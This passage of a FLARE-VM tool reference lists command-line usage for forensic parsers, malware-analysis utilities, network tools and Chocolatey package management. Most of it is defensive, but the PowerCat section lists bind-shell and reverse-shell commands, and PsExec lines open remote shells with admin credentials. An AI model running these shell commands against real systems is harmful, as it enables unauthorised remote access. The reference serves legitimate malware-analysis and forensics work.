Decompress Electron `.asar` archives (used by Electron apps/malware).

```powershell
asar extract app.asar ./extracted\             # Extract archive
asar list app.asar                             # List contents
asar pack ./source/ output.asar               # Repack archive
```

---

### pkg-unpacker ⭐ (default)
Unpack Node.js pkg applications.

```powershell
pkg-unpacker.exe packed_app.exe C:\unpacked\   # Unpack application
```

---

## 16. Forensic Tools

---

### Eric Zimmerman Tools (EZTools)
The EZ Tools suite provides fast, CLI-focused Windows artifact parsers. All are included.

#### AmcacheParser
Parse Amcache.hve for program execution evidence.

```powershell
AmcacheParser.exe -f C:\Windows\AppCompat\Programs\Amcache.hve --csv C:\output\
AmcacheParser.exe -f Amcache.hve --csvf amcache_results.csv
```

#### AppCompatCacheParser (ShimCache)
Parse ShimCache from SYSTEM registry hive.

```powershell
AppCompatCacheParser.exe -f SYSTEM --csv C:\output\
AppCompatCacheParser.exe -f SYSTEM --csvf shimcache.csv
```

#### EvtxECmd
Parse Windows EVTX event log files with custom maps.

```powershell
EvtxECmd.exe -f Security.evtx --csv C:\output\
EvtxECmd.exe -d C:\Windows\System32\winevt\Logs\ --csv C:\output\  # All logs
EvtxECmd.exe -f Security.evtx --xml C:\output\     # XML output
EvtxECmd.exe -f Security.evtx --json C:\output\    # JSON output
EvtxECmd.exe -f Security.evtx --include "4624,4625,4648"  # Filter event IDs
```

#### MFTECmd
Parse the NTFS Master File Table ($MFT).

```powershell
MFTECmd.exe -f C:\$MFT --csv C:\output\
MFTECmd.exe -f C:\$MFT --csvf mft.csv
MFTECmd.exe -f C:\$MFT --body C:\output\bodyfile.txt  # Bodyfile for timeline
MFTECmd.exe -f C:\$MFT --de 0       # Dump specific entry
```

#### PECmd (Prefetch)
Parse Windows Prefetch files for execution evidence.

```powershell
PECmd.exe -f "NOTEPAD.EXE-12345678.pf"        # Single file
PECmd.exe -d C:\Windows\Prefetch\ --csv C:\output\  # All prefetch files
PECmd.exe -d C:\Windows\Prefetch\ --json C:\output\
```

#### JLECmd (Jump Lists)
Parse Windows Jump Lists.

```powershell
JLECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\" --csv C:\output\
JLECmd.exe -f jumplist.automaticDestinations-ms --csv C:\output\
```

#### LECmd (LNK files)
Parse Windows LNK (shortcut) files.

```powershell
LECmd.exe -f malware_link.lnk                  # Parse single LNK
LECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\" --csv C:\output\
```

#### RBCmd (Recycle Bin)
Parse Recycle Bin artifacts ($I files).

```powershell
RBCmd.exe -d "C:\$Recycle.Bin\" --csv C:\output\
RBCmd.exe -f "$I12345.exe" --csv C:\output\
```

#### RECmd (Registry)
Command-line registry tool with plugin support.

```powershell
RECmd.exe -f NTUSER.DAT --plugins RunKeys --csv C:\output\
RECmd.exe -f NTUSER.DAT --all --csv C:\output\
RECmd.exe -f SYSTEM --plugins USBDevices --csv C:\output\
RECmd.exe -f NTUSER.DAT -k "Software\Microsoft\Windows\CurrentVersion\Run" --csv C:\output\
RECmd.exe --pl                                 # List available plugins
```

#### SBECmd (ShellBags)
Parse ShellBag artifacts from USRCLASS.DAT and NTUSER.DAT.

```powershell
SBECmd.exe -d "C:\Users\user\" --csv C:\output\
SBECmd.exe -f USRCLASS.DAT --csv C:\output\
```

#### WxTCmd (Windows Timeline)
Parse Windows 10 Activity Database (ActivitiesCache.db).

```powershell
WxTCmd.exe -f "C:\Users\user\AppData\Local\ConnectedDevicesPlatform\L.user\ActivitiesCache.db" --csv C:\output\
```

#### SrumECmd (SRUM)
Parse System Resource Usage Monitor database.

```powershell
SrumECmd.exe -f C:\Windows\System32\sru\SRUDB.dat --csv C:\output\
SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv C:\output\  # Include SOFTWARE hive
```

#### SQLECmd
Find and process SQLite databases with forensic maps.

```powershell
SQLECmd.exe -d C:\Users\user\ --csv C:\output\   # Scan directory for SQLite files
SQLECmd.exe -f places.sqlite --csv C:\output\    # Single file
```

#### Timeline Explorer ⭐ (default)
View and filter CSV/Excel timeline data with fast search and grouping.

```powershell
TimelineExplorer.exe timeline.csv              # Open CSV timeline
# Features: instant search, column grouping, color tagging, filtering
# Perfect for viewing Plaso/psort output, EvtxECmd results, etc.
```

---

### Chainsaw
Fast Windows forensic artifact analysis — event logs, MFT file threat hunting.

```powershell
chainsaw.exe hunt C:\Windows\System32\winevt\Logs\ --sigma sigma_rules\ --mapping mappings\sigma-event-logs-all.yml --csv C:\output\
chainsaw.exe search -e "4624" C:\Windows\System32\winevt\Logs\Security.evtx
chainsaw.exe analyse --csv C:\output\ C:\Windows\System32\winevt\Logs\
chainsaw.exe dump C:\Windows\System32\winevt\Logs\Security.evtx
```

---

### Hayabusa
Windows event log fast forensics timeline generator with Sigma rule support.

```powershell
hayabusa.exe csv-timeline -d C:\Windows\System32\winevt\Logs\ -o timeline.csv
hayabusa.exe json-timeline -d C:\evtx\ -o timeline.json
hayabusa.exe search -d C:\evtx\ -r rules\ -o results.csv
hayabusa.exe metrics -d C:\evtx\                # Event statistics
hayabusa.exe logon-summary -d C:\evtx\          # Logon summary
hayabusa.exe pivot-keywords-list -d C:\evtx\    # Find pivot keywords
hayabusa.exe update-rules                        # Update detection rules
```

---

### FTK Imager
Disk imaging and evidence preview tool.

```powershell
# GUI — main use
FTKImager.exe

# CLI mode
FTKImager.exe /CreateDiskImage /SourceDrive:PhysicalDrive1 /DestPath:C:\cases\image.E01 /ImageType:E01
FTKImager.exe /MountImage C:\cases\image.E01 /Drive:P
FTKImager.exe /UnmountImage /Drive:P
```

---

### Arsenal Image Mounter
Mount disk images as complete disks in Windows.

```powershell
ArsenalImageMounter.exe                        # Launch GUI
aim_cli.exe --mount C:\cases\image.E01 --drive 1  # Mount image
aim_cli.exe --umount --drive 1                 # Unmount
aim_cli.exe --list                             # List mounted images
```

---

### VSCMount
Mount all Volume Shadow Copies on a drive.

```powershell
vscmount.exe /drive:C /mount:V                 # Mount all VSCs on C: to V:\
# Results in V:\Volume1, V:\Volume2, etc.
```

---

### Autopsy
Open-source digital forensics platform with GUI.

```powershell
# Launch GUI
autopsy.exe

# Key features: disk image analysis, file recovery, keyword search,
# timeline, hash database lookups, browser history, email analysis
```

---

### LogFileParser
Parse NTFS $LogFile transaction journal.

```powershell
LogFileParser.exe --csv C:\output\ -f C:\LogFile  # Parse $LogFile
LogFileParser.exe -f C:\LogFile --mft C:\MFT --csv C:\output\  # With MFT context
```

---

### DCode
Convert forensic timestamps between formats.

```powershell
# GUI — paste a timestamp value and it converts across all formats
dcode.exe "1672531200"                         # Unix timestamp
dcode.exe "133170432000000000"                 # Windows FILETIME
```

---

## 17. Registry Analysis

---

### RegShot ⭐ (default)
Snapshot and diff the Windows registry to detect changes from malware execution.

```powershell
regshot.exe                                    # Launch GUI

# Workflow:
# 1. Click "1st shot" BEFORE running malware
# 2. Execute the malware
# 3. Click "2nd shot" AFTER execution
# 4. Click "Compare" to see all registry changes
```

---

### RegCool ⭐ (default)
Advanced Windows Registry editor with search, compare, and export.

```powershell
RegCool.exe                                    # Launch GUI
# Features: multi-level undo, offline hive loading, compare hives,
#           bookmark favorite keys, search by value/name/data
```

---

### RECmd / Registry Explorer
See EZ Tools section above. Registry Explorer is the GUI companion:

```powershell
RegistryExplorer.exe                           # GUI hive browser
RegistryExplorer.exe -d C:\hives\              # Load hive directory

# RECmd CLI:
RECmd.exe -f NTUSER.DAT --csv C:\output\
RECmd.exe -f SYSTEM --plugins all --csv C:\output\
```

---

### reg_export ⭐ (default)
Export raw registry value content to a file.

```powershell
reg_export.exe "HKCU\Software\Malware\Config" config_value output.bin
reg_export.exe "HKLM\SYSTEM\CurrentControlSet\Services\malware" ImagePath path.txt
```

---

### RLA (Registry Log Applier)
Replay transaction logs to make dirty registry hives readable.

```powershell
RLA.exe -f NTUSER.DAT                          # Apply transaction logs
RLA.exe -d C:\hives\                           # Process all hives in directory
# Use before parsing hives that show as "dirty"
```

---

## 18. Networking

---

### FakeNet-NG ⭐ (default)
Intercept and redirect all network traffic from malware for analysis.

```powershell
# Launch as administrator
fakenet.exe

# With configuration file
fakenet.exe -c C:\tools\fakenet-ng\configs\default.ini

# Key default.ini settings to know:
# [Diverter] - NetworkMode = Auto (captures all traffic)
# [DNS_Server] - listen on UDP 53, respond to all queries
# HTTP/HTTPS/FTP/SMTP listeners all pre-configured
# Logs to: fakenet_logs\fakenet_<timestamp>.log
```

---

### Wireshark ⭐ (default)
Network protocol analyzer and packet capture tool.

```powershell
# GUI
Wireshark.exe
Wireshark.exe capture.pcap                     # Open capture file

# CLI (tshark.exe — installed with Wireshark)
tshark.exe -r capture.pcap                     # Read pcap
tshark.exe -r capture.pcap -Y "http"           # Filter HTTP
tshark.exe -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport  # Extract fields
tshark.exe -r capture.pcap -z conv,tcp         # TCP conversation stats
tshark.exe -r capture.pcap --export-objects http,C:\extracted\  # Export HTTP objects
```

---

### WinDump
Windows port of tcpdump.

```powershell
windump.exe -i 1                               # Capture on interface 1
windump.exe -i 1 -w capture.pcap              # Write to file
windump.exe -r capture.pcap                    # Read from file
windump.exe -i 1 port 80                      # Filter HTTP
windump.exe -i 1 host 192.168.1.100           # Filter by host
windump.exe -D                                 # List interfaces
```

---

### Nmap ⭐ (default)
Network scanner and service/OS detection tool.

```powershell
nmap 192.168.1.0/24                            # Host discovery scan
nmap -sV 192.168.1.100                         # Service version detection
nmap -A 192.168.1.100                          # Aggressive scan (OS + services)
nmap -p 1-65535 192.168.1.100                 # All ports
nmap -sU 192.168.1.100                         # UDP scan
nmap -Pn 192.168.1.100                         # Skip host discovery
nmap -oX scan.xml 192.168.1.0/24              # XML output
nmap --script=http-headers 192.168.1.100       # Run script
```

---

### NetworkMiner
Network forensics tool — extract files, credentials, and artifacts from PCAP captures.

```powershell
# GUI
NetworkMiner.exe
NetworkMiner.exe capture.pcap                  # Open capture in GUI

# Key features: extract transferred files, images, certificates,
# DNS queries, credentials, session reconstruction
```

---

### PowerCat
PowerShell implementation of netcat.

```powershell
powercat -l -p 4444                            # Listen on port 4444
powercat -c 192.168.1.100 -p 4444             # Connect
powercat -l -p 4444 -of output.bin            # Receive file
powercat -c 192.168.1.100 -p 4444 -i file.exe # Send file
powercat -l -p 4444 -e cmd.exe                # Bind shell
powercat -c 192.168.1.100 -p 4444 -e cmd.exe  # Reverse shell
```

---

## 19. Utilities & Scripting

---

### Sysinternals Suite ⭐ (default)
Microsoft's essential Windows diagnostics toolkit. Key tools:

#### Process Monitor (Procmon)
Monitor file system, registry, and process/thread activity in real time.

```powershell
procmon.exe                                    # Launch GUI
procmon.exe /Quiet /Minimized /Backingfile C:\cases\procmon.pml  # Background capture
procmon.exe /OpenLog C:\cases\procmon.pml     # Open saved log
procmon.exe /SaveAs C:\cases\output.csv /Quiet  # Save and exit

# Common filters (set in GUI Filter menu):
# Process Name is malware.exe → Include
# Operation is WriteFile → Include
# Path contains HKCU\Software → Include
# Result is SUCCESS → Include
```

#### Process Explorer
Advanced Task Manager — show process tree, parent/child, loaded DLLs, handles.

```powershell
procexp.exe                                    # Launch
procexp.exe /t                                 # Show process tree in console
procexp64.exe                                  # 64-bit version
```

#### Autoruns
Show all auto-start locations in Windows.

```powershell
autoruns.exe                                   # GUI
autorunsc.exe -a -c -user * > autoruns.csv    # CSV output all users
autorunsc.exe -a -c > autoruns.csv             # CSV output current user
autorunsc.exe -h sha256 -c > autoruns.csv     # Include SHA256 hashes
```

#### TCPView
Show all TCP/UDP connections with process names.

```powershell
tcpview.exe                                    # GUI
```

#### Strings (Sysinternals)
Extract Unicode and ASCII strings from files.

```powershell
strings.exe malware.exe                        # Extract ASCII + Unicode
strings.exe -u malware.exe                    # Unicode only
strings.exe -n 8 malware.exe                  # Min length 8
strings64.exe malware.exe                      # 64-bit version
```

#### PsExec
Run processes on remote systems.

```powershell
psexec.exe \\TARGET -u admin -p pass cmd.exe  # Remote shell
psexec.exe -s cmd.exe                          # Run as SYSTEM locally
```

#### Handle
Show open handles for all processes.

```powershell
handle.exe -p malware.exe                      # Handles for process
handle.exe \BaseNamedObjects\mutex_name        # Find process with specific handle
```

---

### System Informer ⭐ (default)
Advanced task manager / process monitor (successor to Process Hacker).

```powershell
# GUI — shows process CPU/memory, network connections, handles, threads, DLLs
SystemInformer.exe

# Key features:
# Right-click process > Properties > Memory tab — search process memory
# Right-click process > Inject DLL
# View > Services — monitor all Windows services
# Network tab — real-time network connections per process
```

---

### API Monitor ⭐ (default)
Monitor and intercept API calls made by applications.

```powershell
apimonitor-x86.exe                             # 32-bit applications
apimonitor-x64.exe                             # 64-bit applications
apimonitor-x86.exe malware.exe                 # Monitor from launch

# Key workflow:
# 1. Select APIs to monitor (e.g., Kernel32, WinINet, WS2_32)
# 2. Start monitoring (play button)
# 3. Call Stack view shows where each API was called from
# 4. Parameters view shows arguments and return values
```

---

### ProcDot ⭐ (default)
Generate visual graphs from Procmon output for malware behavior visualization.

```powershell
# GUI workflow:
# 1. Capture with Procmon → save as CSV
# 2. Load the CSV in ProcDot
# 3. Select target process → Refresh
# 4. Produces interactive process/file/registry/network graph
procdot.exe
```

---

### CyberChef ⭐ (default)
Browser-based data transformation Swiss Army Knife.

```powershell
# Launches in default browser
cyberchef.exe

# Key "recipes" useful for malware analysis:
# From Base64, XOR, ROT13, From Hex, Gunzip, Inflate, AES Decrypt,
# Extract URLs, Extract IPs, Parse NTLM Hash, Convert Timestamps
# Magic (auto-detect encoding), Regular Expression extraction
```

---

### angr ⭐ (default)
Binary analysis framework — symbolic execution, disassembly, vulnerability finding.

```powershell
# Python usage:
python3 -c "
import angr
proj = angr.Project('malware.exe', auto_load_libs=False)
cfg = proj.analyses.CFGFast()   # Control flow graph
print('Entry:', hex(proj.entry))
print('Functions:', len(cfg.functions))
"

# Symbolic execution to find a path:
python3 -c "
import angr, claripy
proj = angr.Project('crackme.exe', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0x401234, avoid=0x401000)  # Find address, avoid address
if simgr.found:
    print(simgr.found[0].posix.dumps(0))       # Print stdin that reached target
"
```

---

### keystone ⭐ (default)
Multi-architecture assembler Python library.

```powershell
python3 -c "
from keystone import *
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm('mov eax, 1; int 0x80')
print([hex(b) for b in encoding])
"

python3 -c "
from keystone import *
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm('xor rax, rax; ret')
print(bytes(encoding).hex())
"
```

---

### YARA ⭐ (default)
Identify and classify malware with pattern matching rules.

```powershell
yara.exe rules.yar malware.exe                 # Scan with rule file
yara.exe rules.yar malware.exe -s             # Show matching strings
yara.exe -r rules/ C:\samples\               # Recursive directory scan
yara.exe rules.yar malware.exe -m             # Print module metadata
yara.exe rules/ C:\samples\ -f               # Fast mode (skip unmatched)

# Write a quick inline rule:
yara.exe -x 'rule test{strings: $a="http" condition: $a}' malware.exe
```

---

### CryptoTester ⭐ (default)
Utility for performing cryptanalysis — especially useful for ransomware analysis.

```powershell
# GUI-based tool
CryptoTester.exe

# Features:
# Test AES, RSA, ChaCha20, RC4, custom XOR decryption
# Import key material from memory dumps or config extractions
# Decrypt files to verify ransomware key material
```

---

### RAT King Parser ⭐ (default)
Multi-family RAT configuration extractor.

```powershell
rat-king-parser.exe malware.exe                # Extract RAT config
rat-king-parser.exe malware.exe -o config.json # JSON output
rat-king-parser.exe -d C:\samples\            # Batch scan directory
# Supports: AsyncRAT, DcRAT, VenomRAT, QuasarRAT, XWorm, and more
```

---

### map (FLARE utilities) ⭐ (default)
Small utility applications from the FLARE team for analyzing malicious code.
Installed to `C:\tools\flare\`

```powershell
# Includes shellcode utilities:
shellcode2exe.bat shellcode.bin         # Convert shellcode to EXE (32-bit)
shellcode2exe64.bat shellcode.bin       # Convert shellcode to EXE (64-bit)
run_scdbg.bat shellcode.bin             # Quick scdbg run
hex2raw.exe "4d 5a 90 00"               # Convert hex string to binary
raw2hex.exe shellcode.bin               # Binary to hex
charcode.exe "This program"             # Show char codes for a string
```

---

### CAPESolo
Standalone sandbox tool with unpacker and debugger.

```powershell
capesolo.exe malware.exe                       # Run in sandbox
capesolo.exe malware.exe -o C:\dump\           # Specify output dir
```

---

### nasm ⭐ (default)
x86-64 assembler.

```powershell
nasm.exe -f bin shellcode.asm -o shellcode.bin   # Assemble to binary
nasm.exe -f win64 code.asm -o code.obj           # Windows 64-bit object
nasm.exe -l listing.txt -f bin shellcode.asm -o shellcode.bin  # With listing
```

---

### 7-Zip ⭐ (default)
Archive tool with NSIS decompilation support and "Unzip Infected" right-click option.

```powershell
7z.exe x archive.zip -o C:\extracted\          # Extract
7z.exe l malware.zip                            # List contents
7z.exe x malware.zip -p"infected"              # Extract with password
7z.exe a output.7z C:\samples\                 # Create archive
7z.exe x malware.exe                            # Attempt NSIS extraction
```

---

### Cmder ⭐ (default)
Enhanced Windows console emulator with Unix tools.

```powershell
# Launch from desktop or start menu
cmder.exe

# Includes: bash, grep, sed, awk, cat, ls, find, curl, git, ssh
# Unix commands work natively within cmder
```

---

### Cygwin ⭐ (default)
Unix-like environment for Windows.

```powershell
bash.exe                                       # Open bash shell
bash.exe -c "strings malware.exe | grep http"  # Run command

# Installed utilities include:
# grep, sed, awk, find, python3, perl, strings, xxd, od, hexdump, etc.
```

---

### IPython ⭐ (default)
Enhanced interactive Python shell.

```powershell
ipython                                        # Launch interactive shell
ipython malware_analysis.py                   # Run script
ipython -c "import pefile; pe = pefile.PE('malware.exe'); print(pe.dump_info())"
```

---

### RpcView
Explore and decompile RPC interfaces on a Windows system.

```powershell
# GUI
RpcView.exe

# Enumerate all RPC servers and their interfaces
# Useful for finding COM/RPC lateral movement or persistence
```

---

## 20. Sysinternals Suite (Quick Reference)

All Sysinternals tools are installed to `C:\tools\sysinternals\` and accessible from PATH.

```powershell
# Most-used tools with common flags:
procmon.exe          # Process Monitor — file/reg/network activity
procexp.exe          # Process Explorer — process tree with details
autoruns.exe         # Auto-start locations
tcpview.exe          # TCP/UDP connection monitor
strings.exe malware.exe  # String extraction
pslist.exe           # List all processes
pskill.exe malware.exe   # Kill process by name
psexec.exe \\HOST cmd.exe  # Remote execution
handle.exe -p 1234   # Open handles for PID
listdlls.exe 1234    # DLLs loaded by PID
sigcheck.exe -a malware.exe  # File signature/VirusTotal check
sigcheck.exe -vt -a malware.exe  # Check with VirusTotal API
accesschk.exe -p 1234  # Access checks for PID
sdelete.exe -p 3 malware.exe  # Secure delete
diskmon.exe          # Monitor disk activity
filemon.exe          # Monitor file activity (legacy)
regmon.exe           # Monitor registry (legacy, use procmon)
notmyfault.exe       # Crash system for analysis (use carefully)
vmmap.exe 1234       # Virtual memory map for process
```

---

## 21. Package Management

FLARE-VM uses Chocolatey for package management.

```powershell
# Install a package (as Administrator)
choco install -y x64dbg.vm
choco install -y ghidra.vm
choco install -y "ida.plugin.capa.vm"

# Install multiple packages
choco install -y x64dbg.vm ghidra.vm capa.vm floss.vm

# Update all packages
choco upgrade all -y

# Update a specific package
choco upgrade x64dbg.vm -y

# List installed packages
choco list --local-only

# Uninstall a package
choco uninstall x64dbg.vm -y

# Search available packages
choco search malware-analysis

# Update FLARE-VM itself
choco upgrade vm.common -y
choco upgrade flarevm.config.vm -y

# Install from custom config
.\install.ps1 -customConfig "C:\myconfig.xml" -password "YourPass" -noWait -noGui

# Install FLARE-VM fresh on a new Windows VM
(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',"$([Environment]::GetFolderPath('Desktop'))\install.ps1")
Unblock-File .\install.ps1
Set-ExecutionPolicy Unrestricted -Force
.\install.ps1
```

---

*Sources: [github.com/mandiant/flare-vm](https://github.com/mandiant/flare-vm) | [github.com/mandiant/VM-Packages/wiki/Packages](https://github.com/mandiant/VM-Packages/wiki/Packages) | Tool-specific documentation.*  
*⭐ = included in default FLARE-VM installation. Compiled June 2026.*
